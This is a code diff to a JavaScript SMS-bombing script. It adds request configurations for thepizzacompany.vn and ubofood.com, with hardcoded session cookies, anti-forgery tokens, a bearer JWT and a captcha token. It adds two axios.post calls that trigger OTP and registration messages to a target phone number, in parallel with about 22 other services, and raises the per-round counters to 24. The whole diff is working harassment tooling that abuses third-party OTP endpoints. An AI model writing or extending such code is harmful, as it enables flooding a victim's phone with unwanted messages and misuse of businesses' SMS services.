@@ -699,7 +699,77 @@ const payload = {
       'phone': phone,
         'type': 'register',
     };
-            
+
+    const tpcCookies = {
+      '_gcl_au': '1.1.612062991.1693832247',
+        '_ga': 'GA1.2.2100968570.1693832247',
+        '_gid': 'GA1.2.823438155.1693832247',
+        '_tt_enable_cookie': '1',
+        '_ttp': '8QojcD2E-4ZWQyk38eZM5QTGEw2',
+        '.Nop.Antiforgery': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfv24E3RhNn0Gzh_ZfI8o8Wz_70E5dmeH7esZnGk3kfpDoYl0nqfmWCM_bYhqeky2NpCvnsTzzuXkhQkM4j09nkqPhBnh1uMPP21hU9AV3mD3T8lmMRWX12116_xJvTbus',
+        '.Nop.Customer': 'ba54ce0a-13e1-453c-8363-88bf017b8dcf',
+        '.Nop.TempData': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMc3b9L6dS2K_oLOoyagdN1aldzaP3FtbjTZaRpraxoLyzli6tkONSWN-v0l1iigLI3u1FBkohAWQUURHDTENd1iCBv_bPKzmveLCo6E85w0E0PwkXLwDRiNyXvpU2-ffdmp97k0oVyXxa9RccWGi_uxVLdRep6tdHrKuPdgP06w7g',
+    };
+
+    const tpcHeaders = {
+      'authority': 'thepizzacompany.vn',
+        'accept': '*/*',
+        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'dnt': '1',
+        'origin': 'https://thepizzacompany.vn',
+        'referer': 'https://thepizzacompany.vn/Otp',
+        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+        'x-requested-with': 'XMLHttpRequest',
+    };
+
+    const tpcData = {
+      'phone': phone,
+        '__RequestVerificationToken': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdA6eKbtod3RRZhW0oMAbjY51WN7NObT74BSrixWfCNutY-oIWf45xqyHeDAqa6uoqs1jgc1YTZb9K75G_VbjoHC5Tpa6zerOu5KrKhCjOuHPKVnuUfgka_VUVi1RwMXbg',
+    };
+
+    const ubofoodCookies = {
+      '_gcl_au': '1.1.621175732.1703862038',
+        '_ga': 'GA1.1.1365287929.1703862041',
+        '_tt_enable_cookie': '1',
+        '_ttp': 'ND5eC2lhZd7Sracvqbh-Nlb6Ioa',
+        '_fbp': 'fb.1.1703862042460.762032013',
+        'ubo_trade': '%7B%22code%22%3A%22101019000%22%2C%22name%22%3A%22H%C3%A0%20N%E1%BB%99i%22%2C%22email%22%3A%22info%40ubofood.com%22%2C%22phone_number%22%3A%220344350998%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%221%22%2C%22name%22%3A%22Mi%E1%BB%81n%20B%E1%BA%AFc%22%7D%2C%22city%22%3A%7B%22code%22%3A%2201%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%C3%A0%20N%E1%BB%99i%22%7D%2C%22district%22%3A%7B%22code%22%3A%22019%22%2C%22name%22%3A%22Qu%E1%BA%ADn%20Nam%20T%E1%BB%AB%20Li%C3%AAm%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2200637%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%20Trung%20V%C4%83n%22%7D%2C%22text%22%3A%22CT1A%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A20.995577269420178%2C%22lng%22%3A105.77924502563441%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-07-05T15%3A16%3A56.5Z%22%2C%22updated_at%22%3A%222023-02-21T06%3A51%3A36.733Z%22%2C%22updated_by%22%3A%22admin%22%2C%22default_pos_code%22%3A%2200616002%22%7D',
+        'ubo_token': 'Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzUzOTgwNTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjEwMTAxOTAwMCJ9.Yo_06mV-TRA1bUKZAcltCC-QzaV231uwfsVZHpBlxYDqfNrz5_PVXhEBvRCS2CGb5pBH1pN5t_XJqHQtb7xCASn7U472sf3CYdz0Fq-GkxqSksphrVTYqFUMaxVZolzfYr8ZF28rWbDb64ORnEWAf8nFiKM5KlilnVSHcb3vUWtijk1nAE_kMi_3vYlPChvv7FWecDKSZPJeszKnaI3KJzUIRouY0rPWnE_CWJyxblc6UC6c7aMAve6F4KrFzs8wcQTfoem5kpwlg3m4tyLluBIdRSjTlEA4H0k2xL2vmx5odR7IczPpLz-wGpgPSg_5-9Lk4XPAlpz1Q3833KIpXmbKs_rKowLhG8pXH2c_EARzRarDm6Yu0NM4rVQwNHjdHgLUnGTvKi6oPTJ8RWrx5H0mjc0UY15JlxnjCxmq_Z8k4cleFRDvL05LmQovbY5PTiu3Oi5o7BOJUp55AgpbgLTj1M9kW3EyvDwAdUetwYr0qixoTNumiD1DB4Mpha2coGSxse_10ch0J4fFZosuGfqXDHYaITL1FaoEfyVrBDWS2rVZ00llVZQXqBrvk9nEHaWiGzvZGPZRm9G3HJOEKESp99CPkBYCq31b-n8JGwnHNXzfxdT9SE82mAdu5ckZX4x33rYnUUhr6nHqmycysna5Lwickph03Chq88mPyXQ',
+        '_ga_KCGG79N4SY': 'GS1.1.1703862040.1.1.1703862075.0.0.0',
+        '_ga_3PKTQRQF3P': 'GS1.1.1703862040.1.1.1703862078.22.0.0',
+    };
+
+    const ubofoodHeaders = {
+      'Accept': 'application/json, text/plain, */*',
+        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
+        'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzUzOTgwNTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjEwMTAxOTAwMCJ9.Yo_06mV-TRA1bUKZAcltCC-QzaV231uwfsVZHpBlxYDqfNrz5_PVXhEBvRCS2CGb5pBH1pN5t_XJqHQtb7xCASn7U472sf3CYdz0Fq-GkxqSksphrVTYqFUMaxVZolzfYr8ZF28rWbDb64ORnEWAf8nFiKM5KlilnVSHcb3vUWtijk1nAE_kMi_3vYlPChvv7FWecDKSZPJeszKnaI3KJzUIRouY0rPWnE_CWJyxblc6UC6c7aMAve6F4KrFzs8wcQTfoem5kpwlg3m4tyLluBIdRSjTlEA4H0k2xL2vmx5odR7IczPpLz-wGpgPSg_5-9Lk4XPAlpz1Q3833KIpXmbKs_rKowLhG8pXH2c_EARzRarDm6Yu0NM4rVQwNHjdHgLUnGTvKi6oPTJ8RWrx5H0mjc0UY15JlxnjCxmq_Z8k4cleFRDvL05LmQovbY5PTiu3Oi5o7BOJUp55AgpbgLTj1M9kW3EyvDwAdUetwYr0qixoTNumiD1DB4Mpha2coGSxse_10ch0J4fFZosuGfqXDHYaITL1FaoEfyVrBDWS2rVZ00llVZQXqBrvk9nEHaWiGzvZGPZRm9G3HJOEKESp99CPkBYCq31b-n8JGwnHNXzfxdT9SE82mAdu5ckZX4x33rYnUUhr6nHqmycysna5Lwickph03Chq88mPyXQ',
+        'Cache-Control': 'no-cache',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/json; charset=UTF-8',
+        'DNT': '1',
+        'Origin': 'https://ubofood.com',
+        'Referer': 'https://ubofood.com/register',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+    };
+
+    const ubofoodData = {
+      'phone_number': phone,
+        'trade_code': '101019000',
+        'captcha': '03AFcWeA57DLZ2vpQbBNFdhiRbVl9Tl7LLgZNidOGidwem9Qe35fs7vriYjyeNbAHMucJqqubWkbk3utAUXx4-qrLh-ua7cURkFSvCbwjHP-5c8JzP8X8SYo9pTUGqpvBzMhidETa3Z8VDrHiiIfqmsYmEDqxnboFGMQx5CB44u8UxKmqg2egTmd2FGbYheVmTEPUUMZhP84u8T0N_R8_ybq2_2KhyvBETIX2iZni8vRSjl0osIeZ3GAqrq9goXdsml2AEi5s9HfHvktW00l5xvaNvt4FT-AHcqML0jvq-y95-J7sPzjjZRHpKD1q0Mw9NvGR_iFe6DkKpuuM83OjgWVRW2JxCRDE2FKZQ3p7Z0qIV4NqaxlJdTl6lE0RRqXnUAZiEkN0Rm4sSPhD4JkUYJPkAbDMp9FcVb_23bMBDkFtw7jmVaD6FxLFMC99Yl6xR6AUMp3ECYVHeuGV6zchUydZp3aTQAYgIFAipAUGym3eIRuaeq0TfxIzcRNMAtgkYMrwyVFrT46aMYDhQqScFUQvTRve0tpBcmgIwjyb9893ThF54reVSqAHyYoAHPcEUnXJqxvl3onmNehC_qzdNCN6jX9IKKDsvZA',
+    };
 
     // Initial message to be edited later
     let messageID = null;
@@ -779,14 +849,16 @@ const payload = {
         axios.post('https://thitruongsi.com/endpoint/v1/user/api/v4/users/register/step1-phone', thitruongsiData, { headers: thitruongsiHeaders, cookies: thitruongsiCookies }), 
         axios.post(batdongsanUrl), 
         axios.options('https://online-gateway.ghn.vn/sso/public-api/v2/client/checkexistphone', { headers: onlineHeaders }), 
-        axios.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', ghnData, { headers: ghnHeaders }), 
+        axios.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', ghnData, { headers: ghnHeaders }),
+        axios.post('https://thepizzacompany.vn/customer/ResendOtp', tpcData, { headers: tpcHeaders, cookies: tpcCookies }), 
+        axios.post('https://ubofood.com/auth/register', ubofoodData, { headers: ubofoodHeaders, cookies: ubofoodCookies }), 
         ])
       .then(() => {
-        successCount += 22;
+        successCount += 24;
         updateMessage();
       })
       .catch(() => {
-        failureCount += 22;
+        failureCount += 24;
         updateMessage();
       });
     };
